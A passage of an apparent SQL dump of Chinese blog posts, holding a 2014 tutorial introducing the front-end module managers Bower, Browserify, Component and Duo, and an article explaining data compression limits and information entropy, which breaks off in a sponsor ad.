PLh88M+QwdP6m681Lt7xuXbu94vbgcOjwnZHokdE77DtTd1PuvriXeW/h/sYH6AdFD6UeVjxSfNTws+7PbaOWo6fHXMf6Hwc/vj/OGn/2S8Yv7ycKnpCfVEyqTDZPmU2dmnafvvF05dOJZ+nPFmYKf5X+tfa5zvMffnP8rX82YnbiBf/Fp99LXsq/PPRq2aueuYC5R69TXy/MF72Rf3P4LeNt37vwd5MLWe+x7ys/6H7o/ujz8cGn1E+f/gUDmPP8kcBa2wAAADxQTFRFAAAAAAAAAgICBAQEBQUFBgYGBwcHCAgICQkJCgoKDQ0NExMTOTk5c3NzdXV1eHh4eXl5enp6e3t7fHx8rr9WJAAAAAF0Uk5TAEDm2GYAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH3gYMADMaKH8BrQAAAGVJREFUGNONkI0KwCAIhE+32n/b2vu/6yqYCRnshMCPS/SA/6Ikk5vQWXQ7gpL6H1KV54OMbCiuCk0n9rOdma3i1JteuIGIJ1bI60Se2dG4qFWDddQsSeiZpRkILfQ6Hcmvk2NPLzksA4TnEeNNAAAAAElFTkSuQmCC" style="border: 0;" /> 购买文集</a></li>\n<li>社交媒体：<a href="https://twitter.com/ruanyf" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAk1JREFUeNqsVc9rE0EU/mZ3dhPNJl2bVIk/Km09aFBE8GLvnrwJXvwLxIsgCP4Fnit6E8Gb0IMHwUsL9SSNgiAoooJIpE1Joo1h82uT7IxvxmRN3Q32kAdvdrI773vfe+/bDTu9WioDcDAda3Ja8piepQ1avCkCeny0Y+R9KenKwOmHHLvPaKn7AtVOoO8dOWDCMpg+41gMQv5FNEJACgoE8MsPNLDBhgfoutMOsJDmWLmU037C4TApciljwQ/kHoohQxV06+wMXNvE7WINuaSpvdYVKLgWnl3O4zAxU3Z1IYVGT+B5qYWV9z2kbQaT/cOwTsxOUUYF+mB5Dkmi8HG3h2q9hxsFNwRTdvQgxxnXRrMvIdkEhllis/qtiWuLDm4WZnBlPoWnXz28LHdw0uGR7m9Wu3j0qYGEubfn4UlBfXO4gTZltRNMg9w9f0i7kNFxllsBlS0x75gYfxyWTBUjT2W5CSMSPBrQuG21+hiMDS8CeCzF8eSLp13uQ3Ab1IqMFZN8tFHPmgOBF99bYP8Be1Xp6t7OJszJgKpPSiZvaj7uf2hguz2IBQuozDvFH6RDBjuK9wdQDvt0nMpW+8efGyh5UcAeZb2+UcHbnz5Jx4wdlp4yJYU3kLiQtfBwOYeLc8nIwfXtNu69q2Oz4mMxbemYOOOjKarhvq51KUjg3GwiFPIuvcNF6pnSnWK0lOEabNLgQh1aJFAhlGB9rG110B2+oyRNPc0sZbRNFltmLKDKqj4Qrm1ojzOxDz2pyPQ0P7CK4c40/wJ+CzAAGYrXsvfFXR4AAAAASUVORK5CYII=" style="border: 0;" /> twitter</a>，<a href="http://weibo.com/ruanyf" target="_blank"><img src="data:image/png;base64,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" style="border: 0;" /> weibo</a></li>\n<li>Feed订阅： <a href="http://www.ruanyifeng.com/feed.html" target="_blank"><img src="data:image/gif;base64,R0lGODlhFAAUANU2APV1GfmrePZ8IeR5VPq2ieNkLf7p3NpFJveCJ/NoFfibVPR1IexiJfvdzuZrNfXGuOhUEueTevaFOfzIpNxDGeZZJNU6IOubifiVTfOnid1aLuZpLOFSJf/28vJtIvGcefaLSd5kNu9iFv/z6//48//t4uFfLfNkCeJNGuGNc/rCof/+/PVxEeldI/V5KeKMbu9nIvB2OvzQtNxMKfOPXP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAADYALAAAAAAUABQAAAb/QJstEjKZCsjCZsl0pIS2QWXaYsA8noVWIEAgFoNhhWNyMESi7Jbr/aZCFdRnZJAFJCwAt+vlOkwtEBk1hDUkExJ6bQJaGyYMLTQTDSOFHQF8jAseSFYiJwkuAQ2FE1xaHjBIMDAgARguJwABJIQTLJswDEgeIgSEJQQILAqVNQEiui1HHgkBhTUGCiwYtR0xLS0VJhtaEgoEBoQkGCfPNSoQY9xaCwAsCBPALgmkJA4cZN0CAAgY/PJqEIDwgVAECjM0bOAnwcAKGQJclKhRgoGDDjUeUDigkN8vQiBOfByAglSDAxw3IBCgYEU0FyJoEPpA4UGNDjMsaHDQR8EdPVYOMmQYQGHAhQgHLIRIsWAlgASsGMRBMWMGBQtYZ7yIsoBRKkhjOMxAiXJGGCEpHGxIYsSIhrcaQmy1EQQAOw==" style="border: 0;" /></a></li>\n\n</ul></div>        \n        <div><p><strong>[广告]</strong>　<a href="http://www.ruanyifeng.com/blog/www.greenvpn.org/1069807?utm_source=ruanyifeng.com" style="border: none;" target="_blank">GreenVPN是一款运营多年的绿色、稳定、安全的VPN产品，帮助您轻松浏览Google、‍Facebook、Youtube、Twitter等，使用简单，手机电脑全平台支持，可免费试用，值得推荐。</a>\n</p>\n\n</div>', '2014-11-06 23:42:47', 2, '2014-11-20 10:34:19', '2014-09-14 02:13:54', 0, '[["\\u6a21\\u5757", 0.3400820015893713], ["build", 0.29780559615765123], ["js", 0.2552619395637011], ["css", 0.19853706410510083], ["Component", 0.18435584524045076], ["bower", 0.17017462637580072], ["jquery", 0.14181218864650058], ["\\u7f16\\u8bd1", 0.13122486014021353], ["install", 0.12763096978185054], ["script", 0.12763096978185054], ["\\u7ba1\\u7406\\u5668", 0.1154267420688019], ["index", 0.11344975091720047], ["Duo", 0.09926853205255042], ["Browserify", 0.09926853205255042], ["\\u7f51\\u9875", 0.09045057935478054], ["npm", 0.08508731318790036], ["\\u6d4f\\u89c8\\u5668", 0.07726800864270461], ["\\u6587\\u4ef6", 0.07309316600877817], ["component", 0.07090609432325029], ["JavaScript", 0.07090609432325029]]', NULL, NULL, '模块化结构已经成为网站开发的主流。 制作网站的主要工作，不再是自己编写各种功能，而是如何将各种不同的模块组合在一起。 浏览器本身并不提供模块管理的机制，为了调用各个模块，有时不得不在网页中，加入一大堆script标签。这样就使得网页体积臃肿，难以维护，还产生大量的HTTP请求，拖慢显示速度，影响用户体验。 为了解决这个问题，前端的模块管理器（package management）应运而生。它可以轻松管理各种JavaScript脚本的依赖关系，自动加载各个模块，使得网页结构清晰合理。不夸张地说，将来所有的前端JavaScript项目，应该都会采用这种方式开发。 最早也是最有名的前端模块管理器，非RequireJS莫属。它采用AMD格式，异步加载各种模块。具体的用法，可以参考我写的教程。Require.js的问题在于各种参数设置过于繁琐，不容易学习，很难完全掌握。而且，实际应用中，往往还需要在服务器端，将所有模块合并后，再统一加载，这多出了很多工作量。 今天，我介绍另外四种前端模块管理器：Bower，Browserify，Component和Duo。它们各自都有鲜明的特点，很好地弥补了Require.js的缺陷，是前端开发的利器。 需要说明的是，这篇文章并不是这四种模块管理器的教程。我只是想用最简单的例子，说明它们是干什么用的，使得读者有一个大致的印象，知道某一种工作有特定的工具可以完成。详细的用法，还需要参考它们各自的文档。 Bower Bower的主要作用是，为模块的安装、升级和删除，提供一种统一的、可维护的管理模式。 首先，安装Bower。 $ npm install -g bower 然后，使用bower install命令安装各种模块。下面是一些例子。 # 模块的名称 $ bower install jquery # github用户名/项目名 $ bower install jquery/jquery # git代码仓库地址 $ bower install git://github.com/user/package.git # 模块网址 $ bower install http://example.com/script.js 所谓"安装"，就是将该模块（以及其依赖的模块）下载到当前目录的bower_components子目录中。下载后，就可以直接插入网页。 <script src="/bower_componets/jquery/dist/jquery.min.js"> bower update命令用于更新模块。 $ bower update jquery 如果不给出模块的名称，则更新所有模块。 bower uninstall命令用于卸载模块。 $ bower uninstall jquery 注意，默认情况下，会连所依赖的模块一起卸载。比如，如果卸载jquery-ui，会连jquery一起卸载，除非还有别的模块依赖jquery。 Browserify Browserify本身不是模块管理器，只是让服务器端的CommonJS格式的模块可以运行在浏览器端。这意味着通过它，我们可以使用Node.js的npm模块管理器。所以，实际上，它等于间接为浏览器提供了npm的功能。 首先，安装Browserify。 $ npm install -g browserify 然后，编写一个服务器端脚本。 var uniq = require(''uniq''); var nums = [ 5, 2, 1, 3, 2, 5, 4, 2, 0, 1 ]; console.log(uniq(nums)); 上面代码中uniq模块是CommonJS格式，无法在浏览器中运行。这时，Browserify就登场了，将上面代码编译为浏览器脚本。 $ browserify robot.js > bundle.js 生成的bundle.js可以直接插入网页。 <script src="bundle.js"></script> Browserify编译的时候，会将脚本所依赖的模块一起编译进去。这意味着，它可以将多个模块合并成一个文件。 Component Component是Express框架的作者TJ Holowaychuk开发的模块管理器。它的基本思想，是将网页所需要的各种资源（脚本、样式表、图片、字体等）编译后，放到同一个目录中（默认是build目录）。 首先，安装Component。 $ npm install -g component@1.0.0-rc5 上面代码之所以需要指定Component的版本，是因为1.0版还没有正式发布。 然后，在项目根目录下，新建一个index.html。 <!DOCTYPE html> <html> <head> <title>Getting Started with Component</title> <link rel="stylesheet" href="build/build.css"> </head> <body> <h1>Getting Started with Component</h1> <p class="blink">Woo!</p> <script src="build/build.js"></script> </body> </html> 上面代码中的build.css和build.js，就是Component所要生成的目标文件。 接着，在项目根目录下，新建一个component.json文件，作为项目的配置文件。 { "name": "getting-started-with-component", "dependencies": { "necolas/normalize.css": "^3.0.0" }, "scripts": ["index.js"], "styles": ["index.css"] } 上面代码中，指定JavaScript脚本和样式表的原始文件是index.js和index.css两个文件，并且样式表依赖normalize模块（不低于3.0.0版本，但不高于4.0版本）。这里需要注意，Component模块的格式是"github用户名/项目名"。 最后，运行component build命令编译文件。 $ component build installed : necolas/normalize.css@3.0.1 in 267ms build : resolved in 1221ms build : files in 12ms build : build/build.js in 76ms - 1kb build : build/build.css in 80ms - 7kb 在编译的时候，Component自动使用autoprefixer为CSS属性加上浏览器前缀。 目前，Component似乎处于停止开发的状态，代码仓库已经将近半年没有变动过了，官方也推荐优先使用接下来介绍的Duo。 Duo Duo是在Component的基础上开发的，语法和配置文件基本通用，并且借鉴了Browserify和Go语言的一些特点，相当地强大和好用。 首先，安装Duo。 $ npm install -g duo 然后，编写一个本地文件index.js。 var uid = require(''matthewmueller/uid''); var fmt = require(''yields/fmt''); var msg = fmt(''Your unique ID is %s!'', uid()); window.alert(msg); 上面代码加载了uid和fmt两个模块，采用Component的"github用户名/项目名"格式。 接着，编译最终的脚本文件。 $ duo index.js > build.js 编译后的文件可以直接插入网页。 <script src="build.js"></script> Duo不仅可以编译JavaScript，还可以编译CSS。 @import ''necolas/normalize.css''; @import ''./layout/layout.css''; body { color: teal; background: url(''./background-image.jpg''); } 编译时，Duo自动将normalize.css和layout.css，与当前样式表合并成同一个文件。 $ duo index.css > build.css 编译后，插入网页即可。 <link rel="stylesheet" href="build.css"> （完） 文档信息 版权声明：自由转载-非商用-非衍生-保持署名（创意共享3.0许可证） 发表日期： 2014年9月14日 更多内容： 档案 » JavaScript 付费支持： 购买文集 社交媒体： twitter， weibo Feed订阅： [广告] GreenVPN是一款运营多年的绿色、稳定、安全的VPN产品，帮助您轻松浏览Google、‍Facebook、Youtube、Twitter等，使用简单，手机电脑全平台支持，可免费试用，值得推荐。', 1, NULL, NULL),
(16, 'http://www.ruanyifeng.com/blog/2014/09/information-entropy.html', '数据压缩与信息熵', '<p>1992年，美国佐治亚州的WEB Technology公司，宣布做出了重大的技术突破。</p>\n\n        <p>该公司的DataFiles/16软件，号称可以将任意大于64KB的文件，压缩为原始大小的16分之一。业界议论纷纷，如果消息属实，无异于压缩技术的革命。</p>\n\n<p><img alt="数据压缩" src="http://image.beekka.com/blog/2014/bg2014090603.jpg" title="" /></p>\n\n<p>许多专家还没有看到软件，就断言这是不可能的。因为根据压缩原理，你不可能将<strong>任意文件</strong>压缩到16分之一。事实上，有一些文件是无法压缩的，哪怕一个二进制位，都压缩不掉。</p>\n\n<p>后来，事实果然如此，这款软件从来没有正式发布。没过几年，就连WEB Technology公司都消失了。</p>\n\n<p>那么，为何不是所有的文件都可以被压缩？是否存在一个压缩极限呢，也就是说，到了一定大小，就没法再压缩了？</p>\n\n<h2>一、压缩的有限性</h2>\n\n<p>首先，回答第一个问题：为什么WEB Technology公司的发明不可能是真的。</p>\n\n<p>反证法可以轻易地证明这一点。假定任何文件都可以压缩到n个二进制位（bit）以内，那么最多有2<sup>n</sup>种不同的压缩结果。也就是说，如果有2<sup>n</sup>+1个文件，必然至少有两个文件会产生同样的压缩结果。这意味着，这两个文件不可能无损地还原（解压缩）。因此，得到证明，并非所有文件都可以压缩到n个二进制位以下。</p>\n\n<p>很自然地，下一个问题就是，这个n到底是多少？</p>\n\n<h2>二、压缩原理</h2>\n\n<p>要回答一个文件最小可以压缩到多少，必须要知道压缩的原理。</p>\n\n<p>压缩原理其实很简单，就是找出那些重复出现的字符串，然后用更短的符号代替，从而达到缩短字符串的目的。比如，有一篇文章大量使用"中华人民共和国"这个词语，我们用"中国"代替，就缩短了5个字符，如果用"华"代替，就缩短了6个字符。事实上，只要保证对应关系，可以用任意字符代替那些重复出现的字符串。</p>\n\n<p>本质上，所谓"压缩"就是找出文件内容的概率分布，将那些出现概率高的部分代替成更短的形式。所以，内容越是重复的文件，就可以压缩地越小。比如，"ABABABABABABAB"可以压缩成"7AB"。</p>\n\n<p>相应地，如果内容毫无重复，就很难压缩。极端情况就是，遇到那些均匀分布的随机字符串，往往连一个字符都压缩不了。比如，任意排列的10个阿拉伯数字（5271839406），就是无法压缩的；再比如，无理数（比如π）也很难压缩。</p>\n\n<p>压缩就是一个消除冗余的过程，相当于用一种更精简的形式，表达相同的内容。可以想象，压缩过一次以后，文件中的重复字符串将大幅减少。好的压缩算法，可以将冗余降到最低，以至于再也没有办法进一步压缩。所以，压缩已经压缩过的文件（递归压缩），通常是没有意义的。</p>\n\n<h2>三、压缩的极限</h2>\n\n<p>知道了压缩原理之后，就可以计算压缩的极限了。</p>\n\n<p>上一节说过，压缩可以分解成两个步骤。第一步是得到文件内容的概率分布，哪些部分出现的次数多，哪些部分出现的次数少；第二步是对文件进行编码，用较短的符号替代那些重复出现的部分。</p>\n\n<p>第一步的概率分布一般是确定的，现在就来考虑第二步，怎样找到最短的符号作为替代符。</p>\n\n<p>如果文件内容只有两种情况（比如扔硬币的结果），那么只要一个二进制位就够了，1表示正面，0表示表示负面。如果文件内容包含三种情况（比如球赛的结果），那么最少需要两个二进制位。如果文件内容包含六种情况（比如扔筛子的结果），那么最少需要三个二进制位。</p>\n\n<p>一般来说，在均匀分布的情况下，假定一个字符（或字符串）在文件中出现的概率是p，那么在这个位置上最多可能出现1/p种情况。需要log<sub>2</sub>(1/p)个二进制位表示替代符号。</p>\n\n<p>这个结论可以推广到一般情况。假定文件有n个部分组成，每个部分的内容在文件中的出现概率分别为p<sub>1</sub>、p<sub>2</sub>、...p<sub>n</sub>。那么，替代符号占据的二进制最少为下面这个式子。</p>\n\n<blockquote>\n  <p>log<sub>2</sub>(1/p<sub>1</sub>) + log<sub>2</sub>(1/p<sub>2</sub>) + ... + log<sub>2</sub>(1/p<sub>n</sub>)</p>\n\n<p>= ∑ log<sub>2</sub>(1/p<sub>n</sub>)</p>\n</blockquote>\n\n<p>这可以被看作一个文件的压缩极限。</p>\n\n<h2>四、信息熵的公式</h2>\n\n<p>上一节的公式给出了文件压缩的极限。对于n相等的两个文件，概率p决定了这个式子的大小。p越大，表明文件内容越有规律，压缩后的体积就越小；p越小，表明文件内容越随机，压缩后的体积就越大。</p>\n\n<p>为了便于文件之间的比较，将上式除以n，可以得到平均每个符号所占用的二进制位。</p>\n\n<blockquote>\n  <p>∑ log<sub>2</sub>(1/p<sub>n</sub>) / n</p>\n\n<p>= log<sub>2</sub>(1/p<sub>1</sub>)/n + log<sub>2</sub>(1/p<sub>2</sub>)/n + ... + log<sub>2</sub>(1/p<sub>n</sub>)/n</p>\n</blockquote>\n\n<p>由于p是根据频率统计得到的，因此上面的公式等价于下面的形式。</p>\n\n<blockquote>\n  <p>p<sub>1</sub>*log<sub>2</sub>(1/p<sub>1</sub>) + p<sub>2</sub>*log<sub>2</sub>(1/p<sub>2</sub>) + ... + p<sub>n</sub>*log<sub>2</sub>(1/p<sub>n</sub>)</p>\n\n<p>= ∑ p<sub>n</sub>*log<sub>2</sub>(1/p<sub>n</sub>)</p>\n\n<p>= E( log<sub>2</sub>(1/p) )</p>\n</blockquote>\n\n<p>上面式子中最后的E，表示数学期望。可以理解成，每个符号所占用的二进制位，等于概率倒数的对数的数学期望。</p>\n\n<p>下面是一个例子。假定有两个文件都包含1024个符号，在ASCII码的情况下，它们的长度是相等的，都是1KB。甲文件的内容50%是a，30%b，20%是c，则平均每个符号要占用1.49个二进制位。</p>\n\n<blockquote>\n  <p>0.5*log<sub>2</sub>(1/0.5) + 0.3*log<sub>2</sub>(1/0.3) + 0.2*log<sub>2</sub>(1/0.2)</p>\n\n<p>= 1.49</p>\n</blockquote>\n\n<p>既然每个符号要占用1.49个二进制位，那么压缩1024个符号，理论上最少需要1526个二进制位，约0.186KB，相当于压缩掉了81%的体积。</p>\n\n<p>乙文件的内容10%是a，10%是b，......，10%是j，则平均每个符号要占用3.32个二进制位。</p>\n\n<blockquote>\n  <p>0.1*log<sub>2</sub>(1/0.1)*10</p>\n\n<p>= 3.32</p>\n</blockquote>\n\n<p>既然每个符号要占用3.32个二进制位，那么压缩1024个符号，理论上最少需要3400个二进制位，约0.415KB，相当于压缩掉了58%的体积。</p>\n\n<p>对比上面两个算式，可以看到文件内容越是分散（随机），所需要的二进制位就越长。所以，这个值可以用来衡量文件内容的随机性（又称不确定性）。这就叫做信息熵（information entropy）。</p>\n\n<p>它是1948年由美国数学家<a href="http://zh.wikipedia.org/wiki/%E5%85%8B%E5%8A%B3%E5%BE%B7%C2%B7%E9%A6%99%E5%86%9C">克劳德·香农</a>（Claude Shannon）在经典论文<a href="http://cm.bell-labs.com/cm/ms/what/shannonday/shannon1948.pdf">《通信的数学理论》</a>中，首先提出的。</p>\n\n<p><img alt="Claude Shannon" src="http://image.beekka.com/blog/2014/bg2014090604.jpg" title="" /></p>\n\n<h2>五、信息熵的含义</h2>\n\n<p>想要理解信息熵这个概念，有几点需要注意。</p>\n\n<p><strong>（1）信息熵只反映内容的随机性，与内容本身无关。</strong>不管是什么样内容的文件，只要服从同样的概率分布，就会计算得到同样的信息熵。</p>\n\n<p><strong>（2）信息熵越大，表示占用的二进制位越长，因此就可以表达更多的符号。</strong>所以，人们有时也说，信息熵越大，表示信息量越大。不过，由于第一点的原因，这种说法很容易产生误导。较大的信息熵，只表示可能出现的符号较多，并不意味着你可以从中得到更多的信息。</p>\n\n<p><strong>（3）信息熵与热力学的熵，基本无关。</strong>这两个熵不是同一件事，信息熵表示无序的信息，热力学的熵表示无序的能量（参见我写的<a href="http://www.ruanyifeng.com/blog/2013/04/entropy.html">《熵的社会学意义》</a>）。</p>\n\n<p>（文章完）</p>\n\n<p>=====================================================</p>\n\n<p><a id="sponsor"></a></p>\n\n<p>以下为广告部分。欢迎大家在我的网络日志<a href="http://www.ruanyifeng.com/ads.html">投放广告</a>，推广自己的产品。今天介绍的是<a href="http://memoryhere.com/?utm_source=ruanyifeng.com">生命链记忆网</a>。</p>\n\n<p><strong>[赞助商广告]</strong></p>\n\n<p>别人的终究是别人的，今天我们书写自己的传奇！个人史是汇入正史河流的涓涓细流。</p>\n\n<p><a 